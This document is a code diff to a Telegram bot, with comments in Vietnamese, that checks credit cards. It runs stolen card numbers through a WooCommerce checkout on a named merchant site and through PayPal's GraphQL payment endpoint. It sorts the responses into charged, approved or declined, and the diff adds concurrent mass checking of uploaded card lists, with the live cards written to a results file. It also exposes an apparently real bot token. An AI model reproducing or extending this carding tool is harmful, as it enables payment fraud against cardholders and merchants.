@@ -4,21 +4,23 @@ import json
 import random
 import time
 import logging
-import asyncio 
-import aiohttp 
+import asyncio
+import aiohttp
+import io
 from datetime import datetime
 from urllib.parse import urlencode, quote
 
 import requests
-from telegram import Update
+from telegram import Update, InputFile
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.error import BadRequest
 
 # --- Cấu hình Bot và Ứng dụng ---
 # THAY THẾ TOKEN CỦA BẠN VÀO ĐÂY
-TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ" 
+TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
 
 # THAY THẾ ID NGƯỜI DÙNG ĐƯỢC PHÉP SỬ DỤNG BOT VÀO ĐÂY
-AUTHORIZED_USERS = [5127429005] 
+AUTHORIZED_USERS = [5127429005]
 
 # Cấu hình file
 PAYPAL_LOG_FILE = 'paypal.json'
@@ -227,11 +229,11 @@ def detect_card_type(card_number):
 
 def check_card_logic(card):
     """
-    Hàm logic chính để kiểm tra thẻ.
+    Hàm logic chính để kiểm tra thẻ. (Hàm này là synchronous).
     """
     match = re.match(r'^(\d{16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', card)
     if not match:
-        return {'result': 'declined', 'error': 'Invalid card format! Use ccnum|mm|yyyy|cvv'}
+        return {'result': 'declined', 'error': 'Invalid card format! Use ccnum|mm|yyyy|cvv', 'card': card}
 
     n, mm, yy, cvc = match.groups()
     mm = mm.zfill(2)
@@ -240,7 +242,6 @@ def check_card_logic(card):
     
     card_info_str = f"{n}|{mm}|{yy}|{cvc}"
     
-    # TÍCH HỢP HÀM GET BIN MỚI
     # Chạy hàm async từ một hàm sync bằng asyncio.run()
     bin_info = asyncio.run(get_bin_info(n))
 
@@ -263,7 +264,7 @@ def check_card_logic(card):
         }
         resp1 = execute_request_with_proxy(s, 'POST', add_to_cart_url, data=cart_data, headers=cart_headers)
         if not resp1:
-            return {'result': 'declined', 'error': 'Failed to add to cart'}
+            return {'result': 'declined', 'error': 'Failed to add to cart', 'card': card_info_str, 'bin_info': bin_info}
 
         # Bước 2: Truy cập trang thanh toán để lấy nonces
         checkout_url = 'https://switchupcb.com/checkout/'
@@ -273,7 +274,7 @@ def check_card_logic(card):
         }
         resp2 = execute_request_with_proxy(s, 'GET', checkout_url, headers=checkout_headers)
         if not resp2:
-            return {'result': 'declined', 'error': 'Failed to access checkout page'}
+            return {'result': 'declined', 'error': 'Failed to access checkout page', 'card': card_info_str, 'bin_info': bin_info}
         
         checkout_page_content = resp2.text
         sec_match = re.search(r'update_order_review_nonce":"(.*?)"', checkout_page_content)
@@ -281,7 +282,7 @@ def check_card_logic(card):
         create_match = re.search(r'create_order.*?nonce":"(.*?)"', checkout_page_content)
 
         if not (sec_match and check_match and create_match):
-            return {'result': 'declined', 'error': 'Failed to extract nonces'}
+            return {'result': 'declined', 'error': 'Failed to extract nonces', 'card': card_info_str, 'bin_info': bin_info}
         
         sec, check, create = sec_match.group(1), check_match.group(1), create_match.group(1)
         
@@ -299,13 +300,13 @@ def check_card_logic(card):
         
         resp3 = execute_request_with_proxy(s, 'POST', create_order_url, headers=create_order_headers, json=create_order_payload)
         if not resp3:
-            return {'result': 'declined', 'error': 'Failed to create order'}
+            return {'result': 'declined', 'error': 'Failed to create order', 'card': card_info_str, 'bin_info': bin_info}
         
         try:
             paypal_token_id = resp3.json()['data']['id']
         except (json.JSONDecodeError, KeyError):
             log_paypal_result(card_info_str, 'declined', 'Failed to get PayPal token ID', resp3.text, bin_info)
-            return {'result': 'declined', 'error': 'Failed to get PayPal token ID'}
+            return {'result': 'declined', 'error': 'Failed to get PayPal token ID', 'card': card_info_str, 'bin_info': bin_info}
         
         # Bước 6: Gửi yêu cầu thanh toán đến GraphQL của PayPal
         graphql_url = 'https://www.paypal.com/graphql?fetch_credit_form_submit'
@@ -351,12 +352,12 @@ def check_card_logic(card):
                                 result, message = error_map[error_code]
                                 break
                         else: # Fallback
-                             error_msg = error.get('message', '').lower()
-                             if 'invalid' in error_msg and 'cvv' in error_msg: result, message = 'approved', 'Invalid CVV'
-                             elif 'insufficient' in error_msg: result, message = 'approved', 'Insufficient funds'
-                             break
+                            error_msg = error.get('message', '').lower()
+                            if 'invalid' in error_msg and 'cvv' in error_msg: result, message = 'approved', 'Invalid CVV'
+                            elif 'insufficient' in error_msg: result, message = 'approved', 'Insufficient funds'
+                            break
             except json.JSONDecodeError:
-                 if '"status": "succeeded"' in response_text: result, message = 'charged', 'Payment successful'
+                if '"status": "succeeded"' in response_text: result, message = 'charged', 'Payment successful'
 
         log_paypal_result(card_info_str, result, message, response_text, bin_info)
 
@@ -370,6 +371,7 @@ def check_card_logic(card):
 async def run_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
     """Hàm mục tiêu bất đồng bộ để xử lý một thẻ."""
     try:
+        # Chạy hàm blocking trong một thread riêng
         result_dict = await asyncio.to_thread(check_card_logic, card)
         message = format_result_message(result_dict)
     except Exception as e:
@@ -378,58 +380,127 @@ async def run_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE, c
 
     await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
 
-async def run_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
-    """Hàm mục tiêu bất đồng bộ để xử lý nhiều thẻ."""
-    chat_id = update.effective_chat.id
-    total = len(cards)
-    
-    for i, card in enumerate(cards):
-        card = card.strip()
-        if not card:
-            continue
-            
-        try:
-            result_dict = await asyncio.to_thread(check_card_logic, card)
-            message = format_result_message(result_dict, current=i + 1, total=total)
-            await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
-        except Exception as e:
-            logger.error(f"Lỗi khi check hàng loạt thẻ {card}: {e}")
-            message = f"❌ Lỗi xử lý thẻ `{card}`. Chuyển sang thẻ tiếp theo."
-            await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
-        await asyncio.sleep(1)
+# --- CÁC HÀM XỬ LÝ CHECK HÀNG LOẠT ĐỒNG THỜI ---
 
-    await context.bot.send_message(chat_id=chat_id, text="✅ Hoàn tất quá trình kiểm tra hàng loạt!")
+async def run_concurrent_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, status_message_id: int):
+    """
+    Xử lý đồng thời nhiều thẻ và tổng hợp kết quả vào file.
+    """
+    chat_id = update.effective_chat.id
+    total_cards = len(cards)
+    processed_count = 0
+    start_time = time.time()
+    results_list = []
+    
+    # Tạo các tác vụ để chạy đồng thời
+    tasks = [asyncio.to_thread(check_card_logic, card.strip()) for card in cards if card.strip()]
+    
+    last_update_time = 0
+
+    for future in asyncio.as_completed(tasks):
+        try:
+            result_dict = await future
+            results_list.append(result_dict)
+        except Exception as e:
+            logger.error(f"Lỗi nghiêm trọng trong một tác vụ check thẻ: {e}")
+            # Ghi nhận lỗi để không làm mất thẻ
+            results_list.append({'result': 'ERROR', 'message': str(e), 'card': 'UNKNOWN'})
+
+        processed_count += 1
+        
+        # Cập nhật trạng thái mỗi 2 giây để tránh spam API của Telegram
+        current_time = time.time()
+        if current_time - last_update_time > 2 or processed_count == total_cards:
+            elapsed_time = current_time - start_time
+            eta = (elapsed_time / processed_count) * (total_cards - processed_count) if processed_count > 0 else 0
+            status_text = (
+                f"⏳ **ĐANG XỬ LÝ...**\n\n"
+                f"- Đã xử lý: *{processed_count}/{total_cards}* thẻ\n"
+                f"- Thời gian đã qua: *{int(elapsed_time)} giây*\n"
+                f"- Dự kiến hoàn thành sau: *{int(eta)} giây*"
+            )
+            try:
+                await context.bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=status_message_id,
+                    text=status_text,
+                    parse_mode='Markdown'
+                )
+                last_update_time = current_time
+            except BadRequest as e:
+                # Bỏ qua lỗi nếu tin nhắn không thay đổi
+                if "Message is not modified" not in str(e):
+                    logger.warning(f"Không thể chỉnh sửa tin nhắn trạng thái: {e}")
+    
+    # Tạo file kết quả
+    final_results_text = f"--- KẾT QUẢ CHECK HÀNG LOẠT ---\nTổng số thẻ: {total_cards}\n\n"
+    
+    charged_cards = [res for res in results_list if res.get('result') == 'charged']
+    approved_cards = [res for res in results_list if res.get('result') == 'approved']
+    declined_cards = [res for res in results_list if res.get('result') in ['declined', 'ERROR']]
+
+    if charged_cards:
+        final_results_text += f"--- CHARGED ({len(charged_cards)}) ---\n"
+        for res in charged_cards:
+            final_results_text += format_result_message(res, is_for_file=True) + "\n\n"
+            
+    if approved_cards:
+        final_results_text += f"--- APPROVED ({len(approved_cards)}) ---\n"
+        for res in approved_cards:
+            final_results_text += format_result_message(res, is_for_file=True) + "\n\n"
+
+    if declined_cards:
+        final_results_text += f"--- DECLINED ({len(declined_cards)}) ---\n"
+        for res in declined_cards:
+            final_results_text += format_result_message(res, is_for_file=True) + "\n\n"
+
+    # Tạo file trong bộ nhớ
+    file_content_bytes = final_results_text.encode('utf-8')
+    input_file = InputFile(io.BytesIO(file_content_bytes), filename=f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+
+    await context.bot.delete_message(chat_id=chat_id, message_id=status_message_id)
+    await context.bot.send_document(
+        chat_id=chat_id,
+        document=input_file,
+        caption=f"✅ **Hoàn tất!**\n\nĐã kiểm tra xong *{total_cards}* thẻ. File kết quả được đính kèm.",
+        parse_mode='Markdown'
+    )
 
 # --- Các hàm xử lý lệnh của Bot ---
 
-def format_result_message(result_dict, current=None, total=None):
+def format_result_message(result_dict, current=None, total=None, is_for_file=False):
     """Định dạng thông báo kết quả để gửi cho người dùng."""
     result = result_dict.get('result', 'declined')
     status_emoji = "✅" if result in ['charged', 'approved'] else "❌"
     
     header = ""
-    if current and total:
+    if current and total and not is_for_file:
         header = f"*{current}/{total}*\n\n"
         
-    card_info = f"💳 *Card:* `{result_dict.get('card', 'N/A')}`\n"
-    status_info = f"{status_emoji} *Trạng thái:* `{result_dict.get('result', 'N/A').upper()}`\n"
-    message_info = f"💬 *Thông báo:* `{result_dict.get('message', 'N/A')}`\n"
-    gateway_info = f"GATEWAY: *{result_dict.get('gateway', 'N/A')}*\n"
-    author_info = f"AUTHOR: *@{result_dict.get('author', 'N/A')}*\n\n"
+    card_info = f"💳 Card: `{result_dict.get('card', 'N/A')}`\n"
+    status_info = f"{status_emoji} Trạng thái: `{result_dict.get('result', 'N/A').upper()}`\n"
+    message_info = f"💬 Thông báo: `{result_dict.get('message', 'N/A')}`\n"
+    
+    if is_for_file:
+        gateway_info = ""
+        author_info = "--------------------\n"
+    else:
+        gateway_info = f"GATEWAY: *{result_dict.get('gateway', 'N/A')}*\n"
+        author_info = f"AUTHOR: *@{result_dict.get('author', 'N/A')}*\n\n"
     
     bin_info_dict = result_dict.get('bin_info', {})
     if bin_info_dict and bin_info_dict.get('success'):
         bin_details = (
-            f"ℹ️ *Thông tin BIN:*\n"
-            f"  - *Bank:* `{bin_info_dict.get('bank', 'N/A')}`\n"
-            f"  - *Brand:* `{bin_info_dict.get('brand', 'N/A').upper()}`\n"
-            f"  - *Type:* `{bin_info_dict.get('type', 'N/A').upper()}`\n"
-            f"  - *Level:* `{bin_info_dict.get('level', 'N/A').upper()}`\n" # Thêm thông tin level
-            f"  - *Country:* `{bin_info_dict.get('country', 'N/A')} ({bin_info_dict.get('country_code', 'N/A')})`\n"
+            f"ℹ️ Thông tin BIN:\n"
+            f"  - Bank: `{bin_info_dict.get('bank', 'N/A')}`\n"
+            f"  - Brand: `{bin_info_dict.get('brand', 'N/A').upper()}`\n"
+            f"  - Type: `{bin_info_dict.get('type', 'N/A').upper()}`\n"
+            f"  - Level: `{bin_info_dict.get('level', 'N/A').upper()}`\n"
+            f"  - Country: `{bin_info_dict.get('country', 'N/A')} ({bin_info_dict.get('country_code', 'N/A')})`\n"
         )
     else:
         error_msg = bin_info_dict.get('error', 'Không thể truy xuất')
-        bin_details = f"ℹ️ *Thông tin BIN:* `{error_msg}`\n"
+        bin_details = f"ℹ️ Thông tin BIN: `{error_msg}`\n"
 
     return header + card_info + status_info + message_info + gateway_info + author_info + bin_details
 
@@ -468,8 +539,6 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Bạn không được phép sử dụng lệnh này.")
         return
 
-    # Hàm này giờ sẽ được trigger bởi cả CommandHandler và MessageHandler
-    # nên cần kiểm tra xem có document không
     if not update.message.document:
         await update.message.reply_text("Vui lòng gửi kèm một file .txt chứa danh sách thẻ với lệnh `/mass`.")
         return
@@ -479,21 +548,25 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Định dạng file không hợp lệ. Vui lòng chỉ gửi file .txt.")
         return
 
-    await update.message.reply_text("⏳ Đang tải file và chuẩn bị kiểm tra...")
-
     try:
         file = await context.bot.get_file(document.file_id)
         file_content_bytes = await file.download_as_bytearray()
         file_content = file_content_bytes.decode('utf-8')
         cards = file_content.splitlines()
+        cards = [line for line in cards if line.strip()] # Loại bỏ các dòng trống
 
         if not cards:
             await update.message.reply_text("File rỗng, không có thẻ nào để kiểm tra.")
             return
-
-        await update.message.reply_text(f"✅ Đã nhận được {len(cards)} thẻ. Bắt đầu quá trình kiểm tra hàng loạt (kết quả sẽ được gửi riêng cho từng thẻ)...")
         
-        asyncio.create_task(run_mass_check(update, context, cards))
+        status_message = await update.message.reply_text(
+            f"✅ Đã nhận được *{len(cards)}* thẻ. Bắt đầu quá trình kiểm tra đồng thời...\n"
+            "Bạn sẽ nhận được một file kết quả khi hoàn tất.",
+            parse_mode='Markdown'
+        )
+        
+        # Tạo một tác vụ chạy nền để không block bot
+        asyncio.create_task(run_concurrent_mass_check(update, context, cards, status_message.message_id))
 
     except Exception as e:
         logger.error(f"Lỗi khi xử lý file: {e}")
@@ -507,18 +580,16 @@ def main():
     # Thêm các handler cho lệnh
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("cs", cs_command))
-
-    # --- SỬA LỖI MASS COMMAND ---
-    # 1. Xử lý khi người dùng gõ /mass (không có file)
+    
+    # Xử lý khi người dùng gõ /mass (không có file)
     application.add_handler(CommandHandler("mass", mass_command))
     
-    # 2. Xử lý khi người dùng gửi file .txt VỚI CAPTION là /mass
+    # Xử lý khi người dùng gửi file .txt VỚI CAPTION là /mass
     # Sử dụng Regex để đảm bảo caption chính xác là /mass
     application.add_handler(MessageHandler(
         filters.Document.TEXT & filters.CaptionRegex(r'^/mass$'), 
         mass_command
     ))
-    # --- KẾT THÚC SỬA LỖI ---
 
     # Bắt đầu chạy bot
     application.run_polling()
